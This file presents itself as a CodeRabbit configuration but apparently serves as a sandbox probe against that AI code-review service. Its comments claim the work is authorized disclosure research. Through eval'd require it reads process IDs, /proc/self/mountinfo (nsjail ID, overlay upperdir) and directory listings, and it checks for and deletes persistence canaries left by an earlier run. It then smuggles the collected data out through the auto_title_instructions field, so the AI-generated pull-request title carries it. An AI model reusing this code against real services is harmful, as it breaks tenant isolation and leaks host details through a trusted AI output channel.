// CodeRabbit config probe CR-132-INT-H (authorized VDP research on our own PR).
// Revision H of the cr/132-integrity-head channel (G wrote a persistence canary and left it).
// GOAL: direct control for container persistence. Look for the exact file revision G created.
// If it is gone, the evaluation container was destroyed between the two evaluations. If it is
// still there, revision H deletes it immediately so nothing is left behind.
// Reads only what revision G itself wrote. Nothing else is touched.

const MARK = "CR-132-INT-H"
const R: string[] = []

function clip(v: any, n: number): string {
  let s: string
  try {
    s = typeof v === "string" ? v : String(v)
  } catch (_) {
    s = "?"
  }
  s = s.replace(/[^\x20-\x7e]/g, ".")
  return s.length > n ? s.slice(0, n) : s
}

function rec(t: string, v: any): void {
  try {
    R.push(t + "=" + clip(v, 600))
  } catch (_) {
    /* ignore */
  }
}

function safe(t: string, f: () => any): any {
  try {
    const v = f()
    rec(t, v)
    return v
  } catch (e: any) {
    rec(t + "!x", e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR")
    return undefined
  }
}

const rt = safe("A.require", () => eval("typeof require"))

if (rt === "function") {
  const fs: any = eval("require")("node:fs")
  const p: any = (globalThis as any).process
  const P = "/tmp/cr-132-persist-canary-G"

  safe("A.proc", () => "uid=" + p.getuid() + " gid=" + p.getgid() + " pid=" + p.pid + " ppid=" + p.ppid + " cwd=" + p.cwd())
  safe("A.jail_uuid", () => {
    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
    const g = m.match(/nsjail-[0-9a-f-]+/)
    return g ? g[0] : "no-nsjail-id"
  })
  safe("A.upperdir", () => {
    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
    const g = m.match(/upperdir=[^ ]+/)
    return g ? g[0] : "no-upperdir"
  })

  // ---- THE PERSISTENCE CONTROL -------------------------------------------------
  safe("P.G_canary_exists", () => {
    try {
      const st = fs.statSync(P)
      return "STILL_PRESENT ino=" + st.ino + " size=" + st.size
    } catch (e: any) {
      return "GONE(" + (e && e.code ? e.code : "?") + ")"
    }
  })
  safe("P.G_canary_read", () => {
    try {
      const s = String(fs.readFileSync(P, "utf8"))
      return "READBACK [" + clip(s, 200) + "] matchesG=" + (s.indexOf("CR-132-INT-G") === 0)
    } catch (e: any) {
      return "GONE(" + (e && e.code ? e.code : "?") + ")"
    }
  })
  safe("P.home_canary", () => {
    try {
      const st = fs.statSync("/home/jailuser/cr-132-persist-canary-G")
      return "HOME_STILL_PRESENT size=" + st.size
    } catch (e: any) {
      return "HOME_GONE(" + (e && e.code ? e.code : "?") + ")"
    }
  })
  safe("A.ls_tmp", () => fs.readdirSync("/tmp").join(","))
  safe("A.ls_home", () => {
    try {
      return fs.readdirSync("/home/jailuser").join(",")
    } catch (e: any) {
      return "ERR " + (e && e.code ? e.code : "?")
    }
  })
  safe("A.bundle_stat", () => {
    const b = fs.statSync("/tmp/coderabbit-config.cjs")
    return "ino=" + b.ino + " size=" + b.size
  })
  // cleanup, in case the container IS persistent
  safe("C.cleanup", () => {
    let n = 0
    for (const q of ["/tmp/cr-132-persist-canary-G", "/home/jailuser/cr-132-persist-canary-G"]) {
      try {
        fs.unlinkSync(q)
        n++
      } catch (e: any) {
        /* already gone */
      }
    }
    return "unlinked=" + n + " tmp_now=" + fs.readdirSync("/tmp").join(",")
  })
} else {
  rec("A.body", "SKIPPED_no_module_scope_require")
}

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: MARK + " :: " + R.join(" || "),
  },
}
